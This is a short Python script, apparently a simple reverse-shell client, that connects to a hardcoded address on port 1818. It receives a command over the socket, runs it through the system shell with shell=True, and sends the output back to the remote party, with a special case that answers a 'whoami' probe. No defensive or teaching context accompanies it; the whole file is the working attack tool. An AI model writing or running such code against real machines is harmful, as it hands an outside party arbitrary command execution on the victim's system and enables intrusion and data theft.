import socket
import subprocess

s = socket.socket()

port = 1818

TARGET_IP = '192.168.1.6'
s.connect((TARGET_IP, port))
try:
    
        command = s.recv(1024).decode()
        if len(command) > 0:
            print("Recieved command:", command)
            if command == "INITIAL_WHOAMI":
                output = subprocess.check_output("whoami", shell=True).decode("utf-8")
                s.send(output.encode())
            else:
                output = subprocess.check_output(command, shell=True).decode("utf-8")
                print("Command execution returns: ", output)
                s.send(output.encode())
        s.close()
except KeyboardInterrupt:
    s.close()
